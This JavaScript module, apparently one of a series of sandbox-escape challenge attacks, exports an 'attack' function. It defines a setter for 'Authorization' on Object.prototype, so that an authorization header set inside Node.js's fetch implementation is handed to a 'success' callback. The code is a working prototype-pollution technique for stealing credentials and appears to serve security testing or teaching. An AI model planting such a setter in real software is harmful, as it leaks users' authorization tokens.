const urlExample = "https://example.com";

export const attack = (authzManager, success) => {
  try {
    // You think the previous one was annoying?
    // No, this is annoying!
    Object.defineProperty(Object.prototype, "Authorization", {
      get: () => {},
      set: (v) => {
        success(v);
      },
    });
    // Yes, your code does not contain an assignment to a field called Authorization.
    // It's inside the fetch implementation in Node.js and it doesn't work in the browser
    // Sidenote: this example will stop working once I contribute a fix for it.
    // This attack was most recently tested in Node.js v20.4.0
    
  } catch (e) {
    console.log(" ok, you win :( \n", e.message);
  }
  authzManager.authorizedFetch([
    {
      url: urlExample,
      headers: {},
    },
  ]);
};

if (typeof alert !== "undefined") {
  alert("This attack doesn't work in the browser, sorry!");
}
